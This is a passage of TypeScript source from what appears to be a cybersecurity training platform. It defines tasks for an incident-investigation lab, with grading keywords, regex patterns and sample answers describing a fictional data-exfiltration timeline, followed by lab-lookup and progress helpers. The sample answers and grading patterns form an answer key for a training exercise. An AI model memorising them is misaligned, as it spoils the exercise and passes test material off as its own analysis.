        gradingKeywords: ['hr', 'finance', 'pii', 'financial', 'sensitive', 'impact'],
        gradingPatterns: ['HR|human resources|PII', 'Finance|financial|Q2', 'sensitive|confidential|impact|escalat'],
        sampleAnswer: 'HR_Docs (214 files, PII including employee records) and Finance_Q2_Reports (847 files, financial reporting data). Business impact: potential breach of PII (GDPR/CCPA obligations), exposure of unreported financial data (SEC implications), and competitive intelligence risk. Recommend immediate CISO and legal notification.',
      },
      {
        id: 'task-3',
        prompt: 'Describe the full attack timeline from initial access through exfiltration in chronological order.',
        type: 'write',
        hint: 'Start from the first anomalous event. Use the timestamps across all three dataset tabs.',
        gradingKeywords: ['08:10', '08:12', '08:17', 'access', 'stage', 'compress', 'upload'],
        gradingPatterns: ['08:1[0-9]|timeline|chronolog', 'compress|stage|archive|zip', 'POST|upload|exfil'],
        sampleAnswer: '08:10 — C2 staging (pastebin/github recon). 08:12–08:15 — Bulk file access from HR and Finance shares (1,061 files, 438MB). 08:14–08:16 — Data staged into compressed archives (data.zip, finance.zip). 08:17–08:24 — Three-stage HTTP POST upload (717MB) to 185.220.101.47:8443. 08:20+ — Ongoing C2 beaconing to cdn-static.company-update.net every 30 seconds.',
      },
    ],
  },
];

export const ALL_LABS: Lab[] = [...STARTER_LABS, ...PHASE6_LABS];

export function getLabById(id: string): Lab | undefined {
  return ALL_LABS.find((l) => l.id === id);
}

export function getPathById(id: string): LearningPath | undefined {
  return LEARNING_PATHS.find((p) => p.id === id);
}

export function getLabsForPath(pathId: string): Lab[] {
  return STARTER_LABS.filter((l) => l.pathId === pathId);
}

export function pathCompletionPercent(pathId: string, completedLabs: string[]): number {
  const path = getPathById(pathId);
  if (!path) return 0;
  const allLabIds = path.modules.flatMap((m) => m.labIds);
  if (!allLabIds.length) return 0;
  const done = allLabIds.filter((id) => completedLabs.includes(id)).length;
  return Math.round((done / allLabIds.length) * 100);
}
